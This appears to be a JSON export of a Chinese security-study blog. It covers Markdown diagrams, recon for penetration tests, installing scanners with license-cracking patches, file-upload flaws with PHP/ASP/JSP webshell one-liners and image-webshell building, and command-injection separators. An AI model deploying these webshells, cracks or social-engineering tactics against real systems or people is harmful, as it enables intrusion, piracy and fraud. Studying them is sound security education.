D[结果1]\n    C --&gt;|a&#x3D;2| E[结果2]\n    F[横向流程图]\n&#96;&#96;&#96;\n\n2、竖向流程图源码格式：\n&#96;&#96;&#96;mermaid\ngraph TD\nA[方形] --&gt; B(圆角)\n    B --&gt; C&#123;条件a&#125;\n    C --&gt; |a&#x3D;1| D[结果1]\n    C --&gt; |a&#x3D;2| E[结果2]\n    F[竖向流程图]\n&#96;&#96;&#96;\n\n3、标准流程图源码格式：\n&#96;&#96;&#96;flow\nst&#x3D;&gt;start: 开始框\nop&#x3D;&gt;operation: 处理框\ncond&#x3D;&gt;condition: 判断框(是或否?)\nsub1&#x3D;&gt;subroutine: 子流程\nio&#x3D;&gt;inputoutput: 输入输出框\ne&#x3D;&gt;end: 结束框\nst-&gt;op-&gt;cond\ncond(yes)-&gt;io-&gt;e\ncond(no)-&gt;sub1(right)-&gt;op\n&#96;&#96;&#96;\n\n4、标准流程图源码格式（横向）：\n&#96;&#96;&#96;flow\nst&#x3D;&gt;start: 开始框\nop&#x3D;&gt;operation: 处理框\ncond&#x3D;&gt;condition: 判断框(是或否?)\nsub1&#x3D;&gt;subroutine: 子流程\nio&#x3D;&gt;inputoutput: 输入输出框\ne&#x3D;&gt;end: 结束框\nst(right)-&gt;op(right)-&gt;cond\ncond(yes)-&gt;io(bottom)-&gt;e\ncond(no)-&gt;sub1(right)-&gt;op\n&#96;&#96;&#96;\n\n5、UML时序图源码样例：\n&#96;&#96;&#96;sequence\n对象A-&gt;对象B: 对象B你好吗?（请求）\nNote right of 对象B: 对象B的描述\nNote left of 对象A: 对象A的描述(提示)\n对象B--&gt;对象A: 我很好(响应)\n对象A-&gt;对象B: 你真的好吗？\n&#96;&#96;&#96;\n\n6、UML时序图源码复杂样例：\n&#96;&#96;&#96;sequence\nTitle: 标题：复杂使用\n对象A-&gt;对象B: 对象B你好吗?（请求）\nNote right of 对象B: 对象B的描述\nNote left of 对象A: 对象A的描述(提示)\n对象B--&gt;对象A: 我很好(响应)\n对象B-&gt;小三: 你好吗\n小三--&gt;&gt;对象A: 对象B找我了\n对象A-&gt;对象B: 你真的好吗？\nNote over 小三,对象B: 我们是朋友\nparticipant C\nNote right of C: 没人陪我玩\n&#96;&#96;&#96;\n\n7、UML标准时序图样例：\n&#96;&#96;&#96;mermaid\n%% 时序图例子,-&gt; 直线，--&gt;虚线，-&gt;&gt;实线箭头\n  sequenceDiagram\n    participant 张三\n    participant 李四\n    张三-&gt;王五: 王五你好吗？\n    loop 健康检查\n        王五-&gt;王五: 与疾病战斗\n    end\n    Note right of 王五: 合理 食物 &lt;br&#x2F;&gt;看医生...\n    李四--&gt;&gt;张三: 很好!\n    王五-&gt;李四: 你怎么样?\n    李四--&gt;王五: 很好!\n&#96;&#96;&#96;\n\n8、甘特图样例：\n&#96;&#96;&#96;mermaid\n%% 语法示例\n        gantt\n        dateFormat  YYYY-MM-DD\n        title 软件开发甘特图\n        section 设计\n        需求                      :done,    des1, 2014-01-06,2014-01-08\n        原型                      :active,  des2, 2014-01-09, 3d\n        UI设计                     :         des3, after des2, 5d\n    未来任务                     :         des4, after des3, 5d\n        section 开发\n        学习准备理解需求                      :crit, done, 2014-01-06,24h\n        设计框架                             :crit, done, after des2, 2d\n        开发                                 :crit, active, 3d\n        未来任务                              :crit, 5d\n        耍                                   :2d\n        section 测试\n        功能测试                              :active, a1, after des3, 3d\n        压力测试                               :after a1  , 20h\n        测试报告                               : 48h\n&#96;&#96;&#96;\n\n效果图如下：\n\n","slug":"markdown教程","date":"2023-01-10T13:21:22.739Z","categories_index":"环境配置","tags_index":"markdown","author_index":"Abyssaler"},{"id":"4b515816a6e960006dfc09050d5893fe","title":"渗透测试之信息收集","content":"信息收集–渗透测试的灵魂信息收集需要收集哪些内容？为什么要收集这些？1.whois信息什么是whois？​\t whois 指的是域名注册时留下的信息，比如留下管理员的名字、电话号码、邮箱\n为什么要收集whois?​\t域名注册人可能就是网站管理员，可以尝试社工、套路，查询是不是注册了其他域名扩大功击范围。\n如何收集whois信息？\n\n\n\n\n\n\n\n\n\nhttp://whois.chinaz.com/ (站长之家)\nhttps://whois.com \nhttps://www.bugku.com/mima/\n如图,通过域名查询,发现了注册人的邮箱,通过这个邮箱我们可以进行进一步的社工等\n\n在搜索引擎搜索此邮箱\n\n没有发现有价值的信息,但可以确定查询目标的qq号,以后对该目标生成社工字典时也可以参考,同时还能借助qq号发起社工\n\n\n\n\n\n\n\n\n\nhttps://www.bugku.com/mima/ (社工密码生成)\n进一步查询企业的名字\n\n通过各种企业查询类app:\n\n\n\n\n\n\n\n\n\nhttps://www.qcc.com/\nhttps://www.qixin.com/\nhttps://aiqicha.baidu.com/\n2.子域名什么是子域名?顶级域名下的二级域名或者三级甚至更多级的域名都属于子域名，有一些直接ip访问的WEB站也归结于子域名收集范围\nxxx.com（顶级域名）\nxxx.xxx.com（二级域名）\nxxx.xxx.xxx.com（三级域名）\n为什么要收集?子域名可以扩大攻击范围，同一个域名下的二级域名都属于相同资产，一般而言都有相关的联系\n\n\n\n\n\n\n\n\n\n查子域名的网站\nhttps://chaziyu.com/ \nhttps://www.ipbuf.com/Subdomain.html\nhttps://www.dnsgrep.cn/\n\n其他工具\nlayer\n如何收集子域名？\nGoogle语法（见后面）\n网页蜘蛛爬虫\nDNS爆破法\n\n3.端口收集为什么要探测端口？ 有些危险端口开放了我们就可以尝试入侵，例如 445|3306|22|1433|6379 可以尝试爆破或者是使用某些端口存在漏洞的服务。而且有可能一台服务器上面不同端口代表着不同的Web网站\n如何探测端口？ 主要是Nmap扫描工具\n\n\n\n\n\n\n\n\n\nhttps://blog.csdn.net/weixin_42248871/article/details/120981520\nhttps://xbxaq.com/doc/99/\n或者站内搜索nmap\n扫描内网示例，扫描出内网的主机\n\n4.目录扫描为什么要扫描目录？有些网站可能某个目录下是一个新的网站，有的时候目录扫描直接下载了压缩包源码、编辑器目录、一些废弃的页面（会报错）\n如何扫描？御剑目录扫描工具，7k\n7k扫描示例\n\n\n通过目录扫描就进入了后台登录页面了\nrobots协议：robots协议也称爬虫协议、爬虫规则等,是指网站可建立一个robots.txt文件来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取。但是,这个robots协议不是防火墙,也没有强制执行力,搜索引擎完全可以忽视robots.txt文件去抓取网页的快照，如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。\n\nrobots文件对于渗透测试的意义？  可以让我们知道该网站下有哪些目录\n5.指纹识别为什么要指纹识别？ cms可能存在漏洞，如果使用了CMS建站我们可以用通杀漏洞直接攻击\n什么是cms？内容管理系统（Content Management System，CMS），是一种位于WEB前端（Web 服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。这里指的“内容”可能包括文件、表格、图片、数据库中的数据甚至视频等一切你想要发布到Internet、Intranet以及Extranet网站的信息。\n随着个性化的发展，内容管理还辅助WEB前端将内容以个性化的方式提供给内容使用者，即提供个性化的门户框架，以基于WEB技术将内容更好地推送到用户的浏览器端。 \n内容管理系统是企业信息化建设和电子政务的新宠，也是一个相对较新的市场。对于内容管理，业界还没有一个统一的定义，不同的机构有不同的理解。\n常用的cms有哪些？1.企业建站系统：MetInfo(米拓)、蝉知、SiteServer CMS等;点击下载整站源码\n2.B2C商城系统：商派shopex、ecshop、hishop、xpshop等;点击免费试用商城系统\n3.门户建站系统：DedeCMS(织梦)、帝国CMS、PHPCMS、动易、cmstop等;点击查看网站模板\n4.博客系统：wordpress、Z-Blog等;点击查看建站教程\n5.论坛社区：discuz、phpwind、wecenter等;\n6.问题系统：Tipask、whatsns等; 点击查看问题社区\n7.知识百科系统：HDwiki;点击查看网站案例\n8.B2B门户系统：destoon、B2Bbuilder、友邻B2B等;\n9.人才招聘网站系统：骑士CMS、PHP云人才管理系统;\n10.房产网站系统：FangCms等;\n11.在线教育建站系统：kesion(科汛)、EduSoho网校;\n12.电影网站系统：苹果cms、ctcms、movcms等;\n13.小说文学建站系统：JIEQI CMS;\n如何进行指纹识别？一般可以在网页下面找到cms\n\n如果作者隐藏了这些内容，那么就可以用下面这些网站进行识别\n 主要使用在线网站工具进行指纹识别\n\n\n\n\n\n\n\n\n\nhttps://www.yunsee.cn/\nhttp://finger.tidesec.net/\nhttp://whatweb.bugscaner.com/look/\nhttps://s.threatbook.cn/\n6.旁站查询为什么要查询旁站？旁站指的是在同一个ip上面的多个网站，如果你成功拿下旁站，运气好和主站在同一台机器上，是不是就是拿到了主站？ 如果运气不好是一个内网，我们是不是可以尝试内网渗透\n一般而言,网站的主站防护性较强,我们可以通过信息收集到旁站的信息,通过这些站点拿到权限,就有可能拿下ip\n如何查询旁站？\n\n\n\n\n\n\n\n\nhttps://stool.chinaz.com/same\nhttps://www.webscan.cc/\n7.C端扫描C段是什么|为什么要扫描？C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。\n例如192.168.1.1 ,那么192.168.1.1-192.168.1.255 都属于同一个C段，有些学校或者大公司，他们会持有整个IP段，这个ip段中所有的ip都是那个公司的资产，拿下一台可能有有用的信息，可能在同一内网\n确定ip的范围，然后对其段内的Ip主机进行信息收集\n\n\n\n\n\n\n\n\n\nhttps://www.webscan.cc/\n8.内容敏感信息泄露尝试Google语法，找到某些敏感内容，比如包含身份证号码的表格、包含服务器账号密码的文件、某些敏感文件、备份数据库\n\n\n\n\n\n\n\n\n\n\n谷歌镜像站： https://search.ahnu.cf/\nGoogle镜像站地址发布: http://429006.com/article/technology/3810.htm\nGoogle语法详解: https://blog.csdn.net/qq_50589021/article/details/115377111\n\n然后利用查到的敏感信息做社工(过于敏感不便展示)\n9.网络空间搜索引擎(基于物联网搜索，搜索联网的网络设备)网络空间搜索引擎是为了解决个人每次进行渗透测试是都要进行的信息收集过程，通过全网扫描的方式，将基础数据进行格式化存储，供安全人员按需搜索使用，提升了安全人员的工作效率。网络空间搜索引擎的作用就是将互联网上公开的网络资产收集和整理，以此方便人们进行查阅和利用\n网络空间搜索引擎的使用:\n\n\n\n\n\n\n\n\n\nhttps://www.freebuf.com/articles/web/334566.html\nhttps://www.freebuf.com/sectool/308478.html\nhttps://blog.csdn.net/whatday/article/details/84976435\n常用的网络空间搜索引擎：fofa、shodan、zoomeye、censys:\n\n\n\n\n\n\n\n\n\n钟馗之眼: http://www.zoomeye.org\nShodan: https://www.shodan.io\nfofa: https://fofa.info/\n\n","slug":"渗透测试之信息搜集（持续更新）","date":"2023-01-10T13:21:22.739Z","categories_index":"学习笔记","tags_index":"渗透测试","author_index":"Abyssaler"},{"id":"3969cae396587846c4e6dba7e64fd9e1","title":"漏洞扫描工具安装及配置","content":"\n\n\n\n\n\n\n\n\n工具下载地址\n链接：https://pan.baidu.com/s/1Ysn-u1ae6Z-p4PD2lDTKrg?pwd=x3ji提取码：x3ji \nAWVS先将压缩包解压\n\n点击进行安装\n\n一直下一步就行了，让你输邮箱就随便输一个，但是要记住\n\n记住端口号\n\n安装\n\n安装途中会弹窗，询问你是否安装证书，点确认\n\n安装完成\n\n接下来打开另一个工具（仅供学习交流，请支持正版！）\n\n点击确定\n\n会自动打开浏览器，这是你访问本地3443端口\n\n输入安装时的账号和密码登录，发现没有激活成功\n\n别急，用补丁包\n\nWIN+R输入services.msc打开服务\n\n找到并停止这两个服务\n\n把补丁里的license_info.json和wa_data.dat替换掉Acunetix Data的安装目录下的 shared\\license\n\n将补丁包中的wvsc.exe 替换掉Acunetix\\14.3.210615184目录\n\n重新启动服务\n\n使用浏览器访问本机的3343端口，进行登录,激活成功\n\nAppScan解压文件\n\n直接点击安装包安装\n\n选择好路径\n\n安装完成\n\n将这两个文件替换掉安装目录中的文件\n\n\n双击桌面图标运行appscan\n\n汉化\n\n\n然后重启就行了\nNessus解压文件\n\n双击Nessus.msi运行\n\n自己选择安装路径\n\n等待安装,安装完成\n\n当点击finish后，会自动使用浏览器访问本地的8838端口，点击connect via SSL\n\n选择managed scanner，继续\n\n选择Tenable.sc，继续\n\n创建账号密码，继续\n\n安装完成会自动跳转\n\n注册\n以管理员的身份打开powershell\n\n先停止tenable服务\nnet stop &quot;tenable nessus&quot;\n\n\n\n\n切换到当前目录\n\n找到你之前安装nessus的目录\n\n运行代码更新插件\n&amp; &#39;E:\\tools\\Vulnerability scanning\\Nessus\\nessuscli.exe&#39; update .\\all-2.0.tar.gz\n\n\n更新成功\n\n将lougin_feed_info.inc复制到下面这个文件夹\n\ncopy .\\plugin_feed_info.inc &#39;E:\\tools\\Vulnerability scanning\\Nessus\\nessus\\&#39;\n\n\n\n\n找到这个文件夹\n\n执行以下代码\nattrib +s +r +h &#39;E:\\tools\\Vulnerability scanning\\Nessus\\nessus\\plugins\\*.*&#39;\n\n\n然后执行\nattrib +s +r +h &#39;E:\\tools\\Vulnerability scanning\\Nessus\\nessus\\plugin_feed_info.inc&#39;\n\n\n重启nessus\nnet start &quot;tenable nessus&quot;\n\n\n再次访问 https://localhost:8834/#/\n\n等待安装,登陆成功\n\n\n关闭部分选项\nauto_update no 关闭自动更新\nsend_telemetry no\nautomatically update Nessus\n\n\n\n修改之后重新访问https://localhost:8834/#/ 即可\n\n","slug":"漏洞扫描工具安装","date":"2023-01-10T13:21:22.739Z","categories_index":"环境配置","tags_index":"工具","author_index":"Abyssaler"},{"id":"018e7a0983ad8b88508f4c4d22944055","title":"web安全之文件上传漏洞","content":"webshell概述什么是webshell概念webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。\n顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。\n种类  一句话木马、小马、大马、打包马、脱库马、等等\n一句话木马\n介绍：\n一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。\n例子：\nasp一句话木马：&lt;%eval request(&quot;c&quot;)%&gt;\nphp一句话木马： &lt;?php @eval($_POST[value]);?&gt;\nphp一句话木马：&lt;?php $a=$_REQUEST[1]; eval($a);?&gt;\naspx一句话木马：&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;value&quot;])%&gt;\njsp一句话：\n&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt; \n变形：\n&lt;?php $_REQUEST[&#39;a&#39;]($_REQUEST[&#39;b&#39;]); ?&gt;\n&lt;%Eval(Request(chr(112)))%&gt;\n&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;xindong&quot;))%&gt;\n&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;5&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;\n&lt;%a=request(&quot;gold&quot;)%&gt;&lt;%eval a%&gt;\n一句话木马管理软件\n蚁剑，菜刀等，这里介绍蚁剑\n\n右键添加数据\n\n填入你上传一句话木马的网站的url和连接密码（参数）\n\n测试连接\n\n然后就获取后台权限了\n小马\n小马体积小，容易隐藏，隐蔽性强，最重要在于与图片结合一起上传之后可以利用nginx或者IIS6的解析漏洞来运行，不过功能少，一般只有上传或者命令执行等功能。\n大马\n网站管理工具\n用途：提权、打包、脱裤、增删文件\n\n成功上传大马\n\n访问大马的文件路径\n\n输入密码（一般在你大马的源码里）\n\n得到相应权限\n图片马\n把webshell通过二进制的方式写入图片中，即不影响图片本身浏览，又能在图片被包含时解析，或者直接将后缀修改成asp&#x2F;php时亦能解析。\n•把下列这行代码写进1.php文件中\n\n\n•然后利用copy命令生成图片马\ncopy 1.jpg &#x2F;b + 1.php  2.jpg\n文件上传漏洞概述概述：​\tWEB应用程序通常会有文件上传的功能，例如：在BBS发布图片、在个人网站发布ZIP压缩包、在招聘网站上发布DOC格式简历等。只要WEB应用程序允许上传文件，就有可能存在文件上传漏洞。在不对被上传的文件进行限制或者限制被绕过，该功能便有可能被利用于上传可执行文件、脚本到服务器上，从而进一步导致服务器沦陷。\n​    如何确认WEB应用程序是否存在上传漏洞呢？比如：一个BBS论坛，由PHP语言开发，用户可以上传个性头像，也就是图片文件，但文件上传时候并没有对图片格式做验证，导致用户可以上传任意文件，那么这就是一个上传漏洞，总之就是上传的文件被成功当做脚本解析，就代表有文件上传漏洞。\n如何找到上传点Web前台\n\n暴露的编辑器URL\n\n图片&#x2F;头像上传\n\n已知CMS漏洞\n\nCLTPHP_v5.5.3任意文件上传漏洞\n\nPHPCMS_v9.6.0任意文件上传漏洞\n\n\n\n\nWeb后台\n\n集成的编辑器\n文章发布\n文件管理器\n其它上传功能\n\nWeb中间件&#x2F;服务器\n\n“PUT”上传漏洞\nTomcat后台弱口令部署WAR包\nWeblogic文件上传漏洞（如CVE-2018-2894）工具\n基于字典的扫描器\n爬虫\n\n","slug":"web安全之文件上传漏洞","date":"2023-01-10T13:21:22.723Z","categories_index":"学习笔记","tags_index":"漏洞","author_index":"Abyssaler"},{"id":"266dd7a9ffe02e836b26a1bdfda91c39","title":"浅析命令执行漏洞","content":"漏洞描述命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一如PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致，可以执行命令的函数有**system( )、exec( )、shell_exec( )、passthru( )、pcntl_execl( )、popen( )、proc_open( )**等，当攻击者可以控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击PHP执行命令是继承WebServer用户的权限，这个用户一般都有权限向Web目录写文件，可见该漏洞的危害性相当大\n漏洞原理应用程序有时需要调用一些执行系统命令的函数,如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令，当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行漏洞\n常见危险函数php代码相关\neval()\nassert()\npreg_replace\ncall_user_func()\ncall_user_func_array()\ncreate_function\narray_map()\n\n系统命令执行相关\nsystem()\npassthru()\nexec()\npcntl_exec()\nshell_exec()\npopen()\nproc_open()\n&#96;(反单引号)\nob_start()\n\n特殊函数\nphpinfo()\n#这个文件里面包含了PHP的编译选项，启动的扩展、版本、服务器配置信息、环境变量、操作系统信息、path变量等非常重要的敏感配置信息\nsymlink()：\n#一般是在linux服务器上使用的，为一个目标建立一个连接，在读取这个链接所连接的文件的内容，并返回内容\ngetenv\n#获取一个环境变量的值\nputenv($a)\n#添加$a到服务器环境变量，但环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态\n\n\n\n危险函数:systemsystem — 执行外部程序，并且显示输出\n该函数会把执行结果输出并把输出结果的最后一行作为字符串返回如果执行失败则返回false这个也最为常用\n语法\nsystem(string $command, int &amp;$result_code &#x3D; null): string|false\n\n同 C 版本的 system() 函数一样，本函数执行 command 参数所指定的命令，并且输出执行结果。\n如果 PHP 运行在服务器模块中，system() 函数还会尝试在每行输出完毕之后，自动刷新 web 服务器的输出缓存。\n如果要获取一个命令未经任何处理的原始输出，请使用 passthru() 函数。\n\n参数\ncommand\n要执行的命令。\n\nresult_code\n如果提供 result_code 参数，则外部命令执行后的返回状态将会被设置到此变量中\n\n返回值\n成功则返回命令输出的最后一行，失败则返回 false\n\n例子\n&lt;?php\necho &#39;&lt;pre&gt;&#39;;\n\n&#x2F;&#x2F; 输出 shell 命令 &quot;ls&quot; 的返回结果\n&#x2F;&#x2F; 并且将输出的最后一样内容返回到 $last_line。\n&#x2F;&#x2F; 将命令的返回值保存到 $retval。\n$last_line &#x3D; system(&#39;ls&#39;, $retval);\n\n&#x2F;&#x2F; 打印更多信息\necho &#39;\n&lt;&#x2F;pre&gt;\n&lt;hr &#x2F;&gt;Last line of the output: &#39; . $last_line . &#39;\n&lt;hr &#x2F;&gt;Return value: &#39; . $retval;\n?&gt;\n\nexecexec — 执行一个外部程序\n不输出结果返回执行结果的最后一行可以使用output进行输出\n语法\nexec(string $command, array &amp;$output &#x3D; null, int &amp;$result_code &#x3D; null): string|false\n&#x2F;&#x2F;exec() 执行 command 参数所指定的命令。    \n\n参数\ncommand\n要执行的命令。\n\noutput\n如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 \\n 字符。 请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 exec() 函数之前 对数组使用 unset() 函数进行重置。\n\nresult_code\n如果同时提供 output 和 result_code 参数，命令执行后的返回状态会被写入到此变量。\n\n返回值\n命令执行结果的最后一行内容。 如果你需要获取未经处理的全部输出数据， 请使用 passthru() 函数。\n\n失败时返回 false。\n\n如果想要获取命令的输出内容， 请确保使用 output 参数。\n\n例子\n&lt;?php\n&#x2F;&#x2F; 输出运行中的 php&#x2F;httpd 进程的创建者用户名\n&#x2F;&#x2F; （在可以执行 &quot;whoami&quot; 命令的系统上）\n$output&#x3D;null;\n$retval&#x3D;null;\nexec(&#39;whoami&#39;, $output, $retval);\necho &quot;Returned with status $retval and output:\\n&quot;;\nprint_r($output);\n?&gt;\n    \n输出:\nReturned with status 0 and output:\nArray\n(\n    [0] &#x3D;&gt; cmb\n)\n\npassthrupassthru — 执行外部程序并且显示原始输出\n此函数只调用命令并把运行结果原样地直接输出没有返回值。\n语法\npassthru(string $command, int &amp;$result_code &#x3D; null): ?bool\n\n同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。\n参数\ncommand\n要执行的命令。\n\nresult_code\n如果提供 result_code 参数， Unix 命令的返回状态会被记录到此参数\n\n返回值\n成功时返回 null， 或者在失败时返回 false。\n\n例子\n&lt;?php\nhighlight_file(__FILE__);\npassthru(&#39;ls&#39;);\n?&gt;\n\nshell_execshell_exec — 通过 shell 执行命令并将完整的输出以字符串的方式返回\n不输出结果，返回执行结果使用反引号(&#96;&#96;)时调用的就是此函数\n语法\nshell_exec(string $command): string|false|null\n\n参数\ncommand\n要执行的命令。\n\n返回值\nstring 包含已执行命令的输出，如果无法建立管道，则为 false，如果发生错误或者命令不产生输出则为 null\n\n注意:当进程执行过程中发生错误，或者进程不产生输出的情况下，都会返回 null。使用本函数无法检测执行是否成功。当需要访问程序退出代码时，应使用 exec()。\n\n例子\n&lt;?php\n$output &#x3D; shell_exec(&#39;ls -lart&#39;);\necho &quot;&lt;pre&gt;$output&lt;&#x2F;pre&gt;&quot;;\n?&gt;\n\n\n\n命令连接符windows系统“|”：直接执行后面的语句\n例如：ping www.baidu.com|whoami\n\n\n“||”：如果前面执行的语句执行出错，则执行后面的语句\n例如：png www.baidu.com||whoami\n\n\n“&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假\n例如：png www.baidu.com&amp;whoami或者ping www.baidu.com&amp;whoami\n\n\n“&amp;&amp;”：如果前面的语句为真先执行第一个命令后执行第二个命令；为假则直接出错，也不执行后面的语句\n例如：ping www.baidu.com&amp;&amp;whoami png www.baidu.com&amp;&amp;whoami\n\n\nLinux系统“；”执行完前面的命令执行后面的\n\n\n“|”：在linux中，管道符是“|”，主要用于将两个或者多个命令连接到一起，把一个命令的输出作为下一个命令的输入；语法“command1 | command2 [ | commandN... ]”，“|”符左边命令的输出会作为“|”符右边命令的输入。\n\n\n“||”：当前面的语句执行出错时，执行后面的语句\n\n\n“&amp;”：如果前面的语句为假，则直接指向后面的语句，前面的语句可真可假\n\n\n“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句\n\n\n常用命令Windowsnetstat -ano：查看所有进程（1）netstat –ano|findstr [指定端口号]：该命令查看哪个程序或进程占用了端口\ntasklist：列出所有任务及进程号（1）tasklist|findstr [进程名称]：找到进程名称对应的详细信息，例如PID\ntaskkill：杀进程（1）强制结束进程，按名称：taskkill &#x2F;f &#x2F;im notepad.exe（关闭记事本）（2）强制结束进程，按 PID：taskkill &#x2F;f &#x2F;pid 1234（关闭 PID 为 1234 的进程）\n--help或/?：查看帮助信息\ncd：切换目录\nD:：跳转到其他硬盘\nping：测试IP\nipconfig：查看网络详情，类似于linux的ifconfig\ndir：显示目录中的文件内容，类似于linux的ls\ntype：查看文件，类似于linux的cat、less、more；用法：type 文件名\nmd：创建文件夹，类似于linux的mkdir；用法：md 目录名\ntree：查看目录结构\ntracert：路由跟踪，确定IP数据包访问目标时所选择的路径；用法：tracert 域名或IP\ncopy：复制文本文件；用法：copy 文件1 文件2注：参数&#x2F;b指定以二进制格式复制、合并文件，用于图像类&#x2F;声音类文件参数&#x2F;a指定以ASCII格式复制、合并文件，用于txt等文档类文件图片马制作：copy x.jpg&#x2F;b + x.php&#x2F;a xx.jpg\nnet start 服务名；net stop 服务名\ncls：清空cmd命令行，类似于linux的clear\nctrl+C：结束或退出cmd正在执行的脚本\nfind：查找find &#x2F;c “所要搜索的文件所包含的字符串” 文件的绝对路径\nfor：对一个或一组文件，字符串或命令结果中的每一个对象执行特定命令（1）找出C盘下的所有文件，并将所有文件名都输出出来for /r C: %i in (*) do @echo %i（2）找出C盘下所有后缀是.txt的文件，并将其输出for /r C: %i in (*.txt) do @echo %i（3）找出C盘下所有后缀是.txt和.jpg的文件，并将其输出for /r C: %i in (*.txt,*.jpg) do @echo %i\nLinuxcd：切换当前工作目录；用法：cd后面加目录（1）cd &#x2F;root：进入&#x2F;root 目录（2）cd …&#x2F;：返回上一级目录（3）cd .&#x2F;：进入当前目录\nls：显示指定工作目录下的内容；用法：ls 文件或目录（1）ls：.&#x2F; 查看当前目录所有的文件和目录（2）ls -l：以长格式显示目录下的内容列表（3）ls -a：查看所有的文件，包括隐藏文件，以.开头的文件\ncp：拷贝文件；用法：cp 要复制的文件 目标路径（1）cp xx.txt &#x2F;home&#x2F;backup.txt ，拷贝文件至&#x2F;home目录下并且重命名为bak.txt（2） cp xx –r &#x2F;home：拷贝xx目录到&#x2F;home目录下\ncat：查看文件内容；用法：cat 文件绝对路径（1）cat test.txt：查看test.txt文件内容\necho：回显；用法：输入什么就打印什么（1）echo hello\n&gt;：表示追加覆盖；常见用法echo world &gt; test.txt\n&gt;&gt;：表示追加；常见用法echo world &gt;&gt; test.txt\nfind：查找指定文件；用法：find 目录 -name 文件（1）find &#x2F;home -name “*.txt” ：查找&#x2F;home目录下，所有以.txt 结尾的文件或者目录。\ngroupadd：创建组；用法：groupadd 组名；注：在&#x2F;etc&#x2F;group中查看组名；注：将某用户加入root用户组：usermod –g root 用户名\ngroupdel：删除组；用法：groupdel 组名\ngrep：用于查找文件里符合条件的字符串；用法：grep 参数 目标-r：指定要查找目标的是目录而非文件时使用-n：显示具体行数–include：指定后缀文件（1）grep -rn “eval“ target：搜索target目标(目录&#x2F;文件)中是否含有eval的文件，并且确定在所含有的文件中是第几行（2）grep -rn –include&#x3D;‘*.php’ ‘eval(’ target：搜索target目标(目录&#x2F;文件)中是否含有eval的文件(注：这里是指定只搜索.php后缀的文件)，并且确定在所含有的文件中是第几行\nhead：默认查看文件前10行内容；用法：head 文件名；如果查看前20行，用法：head -20 文件名\ntail：默认查看文件后10行内容；用法：tail 文件名，如果查看后20行，用法：tail -20 文件名\nmore或less：分页查看文件内容；用法：more 文件名或less 文件名注：cat 和 more 同时使用例如： cat test.txt |more 分页显示 text 内容，|符号是管道符，用于把|前的输出作为后面命令的输入\nuseradd：创建用户；用法：useradd 用户名，注：在&#x2F;etc&#x2F;passwd中可查看（1）将用户添加到指定组中： useradd -g 组名 用户\nuserdel：删除用户；用法：userdel 用户名\npasswd： 设置密码；passwd 用户名，不加用户名默认修改当前用户\nvi：修改文件（命令行模式、文本输入模式、末行模式），vi或vim打开一个文件，首先是命令行模式，然后按 i 进入文本输入模式，可以在文件里写入字符等信息。写完后，按 esc 进入命令模式，然后输入:进入末行模式，例如输入 :wq 表示保存退出。如果想直接退出，不保存，可以执行 :q ， 如果无法退出可以使用 q! 强制退出。\nid：显示用户的ID，以及所属群组的ID\nifconfig：显示网络详情\nnetstat：显示网络状态netstat –anplt：查看所有tcp端口netstat –anplu：查看所有udp端口\nkill：删除执行中的程序或工作kill -9：强制执行\nping：检测主机；用法：ping ip\nps：显示当前进程的状态，类似于 windows 的任务管理器\nreboot：重启；用法：reboot 